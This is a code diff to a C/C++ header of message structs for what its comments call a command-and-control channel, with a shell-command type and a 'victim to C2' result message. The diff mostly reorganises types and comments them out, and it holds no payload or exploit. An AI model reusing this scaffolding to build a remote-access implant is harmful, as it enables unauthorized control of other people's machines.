@@ -3,7 +3,7 @@
 #ifndef MESSAGE_TYPES_H
 #define MESSAGE_TYPES_H
 
-
+#include <cstdint>
 
 //#include <stdint.h>
 
@@ -73,7 +73,7 @@ typedef struct
 {
 	MessageHeader header; // the header... always use custom header? no need for tlv... MessageType enum should be defined in header
 	//MessageData payload; // the actual payload
-	uint8_t payload[4096]; // TODO: shouldn't be fixed size?
+	uint8_t* payload; // TODO: shouldn't be fixed size?
 } InternalMessage;
 
 /*
@@ -86,6 +86,7 @@ typedef enum {
 } MessageType;*/
 
 // Command types  
+/*
 typedef enum 
 {
 	CMD_SHELL = 1,      // Execute shell command
@@ -100,7 +101,7 @@ typedef struct
 {
 	CommandType command_type;  // CommandType enum
 	uint32_t data_size;     // Size of command_data
-	char command_data[];    // Flexible array (shell command, filename, etc.)
+	char* command_data;    // Flexible array (shell command, filename, etc.)
 } CommandMessage;
 
 // Result message from victim to C2  
@@ -108,10 +109,10 @@ typedef struct
 {
 	uint32_t exit_code;     // Command exit code
 	uint32_t data_size;     // Size of output_data
-	char output_data[];     // Command output or file data
+	char* output_data;     // Command output or file data
 } ResultMessage;
 
-
+*/
 
 
 #endif
